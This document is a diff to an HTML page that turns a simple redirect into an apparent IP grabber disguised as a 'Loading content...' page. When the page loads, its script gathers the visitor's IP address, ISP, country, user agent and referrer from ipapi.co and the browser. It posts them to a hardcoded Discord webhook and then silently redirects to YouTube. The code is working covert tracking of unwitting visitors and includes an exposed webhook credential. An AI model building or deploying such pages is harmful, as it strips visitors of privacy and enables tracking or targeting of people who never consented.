@@ -2,13 +2,54 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://google.com">
-    <script type="text/javascript">
-        window.location.href = "https://google.com";
-    </script>
     <title>Loading...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    </style>
 </head>
 <body>
-    <p>If you are not redirected automatically, <a href="https://google.com">click here</a>.</p>
+    <p>Loading content...</p>
+
+    <script>
+        // --- CONFIGURATION ---
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1441937602176614451/8tYzx6G4e41dzrL-86s1f5XTl4rgOhmHk5XqsfwAPr1Iu1NZiUlDjH_etjGwzVjuZvnR"; 
+        const TARGET_URL = "https://youtube.com"; 
+        // ---------------------
+
+        async function logAndRedirect() {
+            try {
+                // 1. Get IP and ISP data
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+
+                // 2. Gather Browser Data
+                const logData = {
+                    username: "Visitor Log",
+                    content: `**New Visitor!**\n` +
+                             `**IP:** ${data.ip}\n` +
+                             `**ISP:** ${data.org}\n` +
+                             `**Country:** ${data.country_name}\n` +
+                             `**User Agent:** ${navigator.userAgent}\n` +
+                             `**Referrer:** ${document.referrer || "Direct"}`
+                };
+
+                // 3. Send to Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(logData)
+                });
+
+            } catch (error) {
+                console.error("Logging failed", error);
+            } finally {
+                // 4. Redirect (Even if logging fails, we MUST redirect)
+                window.location.href = TARGET_URL;
+            }
+        }
+
+        // Execute
+        logAndRedirect();
+    </script>
 </body>
 </html>
